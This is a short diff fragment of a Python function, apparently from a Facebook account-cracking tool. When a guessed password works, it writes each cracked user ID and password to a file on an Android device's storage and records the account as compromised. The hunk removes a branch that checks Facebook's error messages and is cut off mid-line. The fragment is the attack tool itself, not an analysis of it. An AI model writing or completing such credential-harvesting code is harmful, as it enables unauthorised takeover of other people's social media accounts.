@@ -460,4 +460,3 @@ def login_1(uid):
                 open('/sdcard/NEHAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''        
